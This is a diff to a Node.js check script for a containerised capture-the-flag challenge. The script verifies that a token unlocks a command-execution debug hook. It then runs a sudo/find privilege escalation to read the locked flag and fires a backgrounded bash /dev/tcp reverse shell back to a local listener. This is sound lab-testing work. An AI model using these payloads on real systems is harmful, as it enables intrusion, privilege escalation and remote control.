@@ -2,6 +2,7 @@
 
 const fs = require('fs');
 const path = require('path');
+const net = require('net');
 const { spawnSync } = require('child_process');
 
 const ROOT_DIR = path.resolve(__dirname, '..');
@@ -21,7 +22,10 @@ const summary = {
   proxyUrl: 'http://127.0.0.1',
   artifactDir,
   commands: [],
-  solved: false
+  debugHookUnlocked: false,
+  directFlagReadDenied: false,
+  privescFlagRead: false,
+  realReverseShellConnected: false
 };
 
 function writeFile(name, data) {
@@ -138,15 +142,108 @@ function assertIncludes(text, needle, label) {
   }
 }
 
-function assertJsonFlag(text) {
+function assertUnlockResponse(text) {
   const parsed = JSON.parse(text);
-  if (parsed.success !== true || !String(parsed.flag || '').startsWith('FLAG{REVERSE_')) {
-    throw new Error(`unexpected solve response: ${text}`);
+  if (parsed.success !== true || parsed.unlocked !== 'debug-hook') {
+    throw new Error(`unexpected unlock response: ${text}`);
   }
-  return parsed.flag;
+  assertIncludes(parsed.message || '', '/reverse/silver/debug', 'unlock response message');
+  if ('flag' in parsed) {
+    throw new Error('unlock response must not return the flag over HTTP');
+  }
+  return parsed;
 }
 
-function main() {
+function expectedFlagFromCompose() {
+  const compose = fs.readFileSync(path.join(ROOT_DIR, 'docker-compose.yml'), 'utf8');
+  const match = compose.match(/CHALLENGE_MODE=\/reverse\/silver\n\s*- FLAG=([^\n]+)/);
+  if (!match) {
+    throw new Error('could not find reverse-silver FLAG in docker-compose.yml');
+  }
+  return match[1].trim();
+}
+
+function curlWithStatus(label, args, options = {}) {
+  const stdout = run(label, 'curl', ['-s', '-w', '\n__HTTP_STATUS__:%{http_code}', ...args], {
+    ...options,
+    allowFailure: true
+  });
+  const marker = '\n__HTTP_STATUS__:';
+  const idx = stdout.lastIndexOf(marker);
+  if (idx === -1) {
+    throw new Error(`${label}: missing status marker in curl output: ${stdout}`);
+  }
+  return {
+    body: stdout.slice(0, idx),
+    status: Number.parseInt(stdout.slice(idx + marker.length).trim(), 10)
+  };
+}
+
+function debugHook(label, { token, cmd, timeoutMs } = {}) {
+  const args = ['-X', 'POST', `${BASE_URL}/reverse/silver/debug`, '-H', 'Content-Type: application/json'];
+  if (token !== undefined) {
+    args.push('-H', `X-Debug-Token: ${token}`);
+  }
+  args.push('-d', JSON.stringify(cmd === undefined ? {} : { cmd }));
+  return curlWithStatus(label, args, { timeoutMs: timeoutMs || 30_000 });
+}
+
+// Fires a backgrounded, disowned reverse-shell one-liner through the debug
+// hook and waits for it to call back on a throwaway local TCP listener. This
+// proves the exploit chain can open a real interactive-style shell out of the
+// container, not just execute one-shot commands over the HTTP debug channel.
+function popRealReverseShell(token) {
+  return new Promise((resolve, reject) => {
+    const marker = `RSHELL_OK_${Date.now()}`;
+    let settled = false;
+    const server = net.createServer();
+
+    const finish = (err, value) => {
+      if (settled) return;
+      settled = true;
+      clearTimeout(timer);
+      server.close();
+      if (err) reject(err);
+      else resolve(value);
+    };
+
+    const timer = setTimeout(() => finish(new Error('reverse shell did not call back within timeout')), 30_000);
+
+    server.on('error', (err) => finish(err));
+    server.on('connection', (socket) => {
+      let buffer = '';
+      let matched = false;
+      socket.on('error', () => {}); // the remote shell may reset the connection after we close it; ignore
+      socket.on('data', (chunk) => {
+        if (matched) return;
+        buffer += chunk.toString('utf8');
+        if (buffer.includes(marker)) {
+          matched = true;
+          socket.end('exit\n');
+          finish(null, buffer);
+        }
+      });
+      socket.write(`echo ${marker}\n`);
+    });
+
+    server.listen(0, '0.0.0.0', () => {
+      const { port } = server.address();
+      const payload = `setsid bash -c 'exec bash -i >& /dev/tcp/host.docker.internal/${port} 0>&1' </dev/null >/dev/null 2>&1 & disown; echo triggered`;
+      let trigger;
+      try {
+        trigger = debugHook('debug-trigger-reverse-shell', { token, cmd: payload, timeoutMs: 15_000 });
+      } catch (err) {
+        finish(err);
+        return;
+      }
+      if (trigger.status !== 200) {
+        finish(new Error(`reverse shell trigger failed: status=${trigger.status} body=${trigger.body}`));
+      }
+    });
+  });
+}
+
+async function main() {
   appendCommandLog(`reverse-silver check started ${new Date().toISOString()}\n`);
   appendCommandLog(`logs: ${artifactDir}\n`);
 
@@ -181,10 +278,61 @@ function main() {
   const solveUrl = `${BASE_URL}/reverse/silver?payload=${encodeURIComponent(token)}`;
   const solved = curl('curl-solved-token', solveUrl);
   writeFile('solved.json', solved);
-  const flag = assertJsonFlag(solved);
-  summary.solved = true;
+  assertUnlockResponse(solved);
   summary.recoveredToken = token;
+  summary.debugHookUnlocked = true;
+
+  const debugNoToken = debugHook('debug-no-token', { cmd: 'id' });
+  writeFile('debug-no-token.json', debugNoToken.body);
+  if (debugNoToken.status !== 403) {
+    throw new Error(`debug hook without a token expected 403, got ${debugNoToken.status}`);
+  }
+
+  const debugWrongToken = debugHook('debug-wrong-token', { token: 'not-the-real-token', cmd: 'id' });
+  writeFile('debug-wrong-token.json', debugWrongToken.body);
+  if (debugWrongToken.status !== 403) {
+    throw new Error(`debug hook with a wrong token expected 403, got ${debugWrongToken.status}`);
+  }
+
+  const debugNoCmd = debugHook('debug-no-cmd', { token });
+  writeFile('debug-no-cmd.json', debugNoCmd.body);
+  if (debugNoCmd.status !== 400) {
+    throw new Error(`debug hook without cmd expected 400, got ${debugNoCmd.status}`);
+  }
+
+  const debugWhoami = debugHook('debug-whoami', { token, cmd: 'whoami' });
+  writeFile('debug-whoami.json', debugWhoami.body);
+  const whoamiJson = JSON.parse(debugWhoami.body);
+  assertIncludes(whoamiJson.stdout || '', 'ctfuser', 'debug hook whoami stdout');
+
+  const flagPath = '/tmp/rndsecurity-isolated/reverse-silver/flag.txt';
+  const debugDirectRead = debugHook('debug-direct-flag-read-denied', { token, cmd: `cat ${flagPath}` });
+  writeFile('debug-direct-flag-read.json', debugDirectRead.body);
+  const directReadJson = JSON.parse(debugDirectRead.body);
+  if (directReadJson.exitCode === 0) {
+    throw new Error('ctfuser could read the locked flag directly over the debug hook; lock failed');
+  }
+  assertIncludes(`${directReadJson.stderr || ''}`, 'Permission denied', 'direct flag read stderr');
+  summary.directFlagReadDenied = true;
+
+  const privescCmd = `sudo find ${flagPath} -maxdepth 0 -exec cat {} \\;`;
+  const debugPrivesc = debugHook('debug-privesc-flag-read', { token, cmd: privescCmd });
+  writeFile('debug-privesc-flag-read.json', debugPrivesc.body);
+  const privescJson = JSON.parse(debugPrivesc.body);
+  if (privescJson.exitCode !== 0) {
+    throw new Error(`sudo/find privesc flag read failed: ${debugPrivesc.body}`);
+  }
+  const flag = (privescJson.stdout || '').trim();
+  const expectedFlag = expectedFlagFromCompose();
+  if (flag !== expectedFlag) {
+    throw new Error(`privesc-read flag mismatch: got=${flag} expected=${expectedFlag}`);
+  }
   summary.flag = flag;
+  summary.privescFlagRead = true;
+
+  const reverseShellTranscript = await popRealReverseShell(token);
+  writeFile('real-reverse-shell-transcript.txt', reverseShellTranscript);
+  summary.realReverseShellConnected = true;
 
   const consoleState = curl('curl-console-state', `${BASE_URL}/__console/state`);
   writeFile('console-state.json', consoleState);
@@ -205,22 +353,31 @@ function main() {
     throw new Error('web proxy artifact did not solve to the same token as the direct service');
   }
 
-  const proxySolved = webGet('web-proxy-solved-token', `/reverse/silver?payload=${encodeURIComponent(token)}`);
+  const proxySolvedUrl = `http://127.0.0.1/reverse/silver?payload=${encodeURIComponent(token)}`;
+  const proxySolved = compose(['exec', '-T', 'web', 'sh', '-lc', `wget -qO- ${shellQuote(proxySolvedUrl)}`], {
+    label: 'web-proxy-solved-token',
+    timeoutMs: 60_000
+  });
   writeFile('web-proxy-solved.json', proxySolved);
-  const proxyFlag = assertJsonFlag(proxySolved);
-  if (proxyFlag !== flag) {
-    throw new Error(`web proxy flag mismatch: direct=${flag} proxy=${proxyFlag}`);
-  }
-  summary.proxySolved = true;
+  assertUnlockResponse(proxySolved);
+  summary.proxyDebugHookUnlocked = true;
 
   const finalConsoleState = curl('curl-console-state-final', `${BASE_URL}/__console/state`);
   writeFile('console-state-final.json', finalConsoleState);
   assertIncludes(finalConsoleState, '[reverse-silver] solved token accepted', 'final console state');
   assertIncludes(finalConsoleState, 'Wget', 'final console state');
 
-  compose(['exec', '-T', 'reverse-silver', 'sh', '-lc', 'ls -la /tmp/rndsecurity-isolated/reverse-silver && cat /tmp/rndsecurity-isolated/reverse-silver/flag.txt'], {
-    label: 'compose-exec-flag-artifact'
-  });
+  compose(
+    [
+      'exec',
+      '-T',
+      'reverse-silver',
+      'sh',
+      '-lc',
+      `ls -la ${flagPath} && ! cat ${flagPath} && sudo find ${flagPath} -maxdepth 0 -exec cat {} \\;`
+    ],
+    { label: 'compose-exec-flag-artifact' }
+  );
 
   console.log(`PASS reverse-silver compose check`);
   console.log(`Recovered token: ${token}`);
@@ -229,29 +386,28 @@ function main() {
 }
 
 let failure = null;
-try {
-  main();
-} catch (error) {
-  failure = error;
-  summary.error = error instanceof Error ? error.message : String(error);
-  console.error(summary.error);
-  process.exitCode = 1;
-} finally {
-  compose(['logs', '--no-color', 'web', 'reverse-silver', 'postgres', 'seed-reverse-silver'], {
-    label: 'compose-logs',
-    allowFailure: true,
-    timeoutMs: 120_000
-  });
-  if (!KEEP_COMPOSE) {
-    compose(['down', '-v', '--remove-orphans'], {
-      label: 'compose-down',
+main()
+  .catch((error) => {
+    failure = error;
+    summary.error = error instanceof Error ? error.message : String(error);
+    console.error(summary.error);
+    process.exitCode = 1;
+  })
+  .then(() => {
+    compose(['logs', '--no-color', 'web', 'reverse-silver', 'postgres', 'seed-reverse-silver'], {
+      label: 'compose-logs',
       allowFailure: true,
       timeoutMs: 120_000
     });
-  }
-  writeFile('summary.json', `${JSON.stringify(summary, null, 2)}\n`);
-}
-
-if (failure) {
-  process.exitCode = 1;
-}
+    if (!KEEP_COMPOSE) {
+      compose(['down', '-v', '--remove-orphans'], {
+        label: 'compose-down',
+        allowFailure: true,
+        timeoutMs: 120_000
+      });
+    }
+    writeFile('summary.json', `${JSON.stringify(summary, null, 2)}\n`);
+    if (failure) {
+      process.exitCode = 1;
+    }
+  });
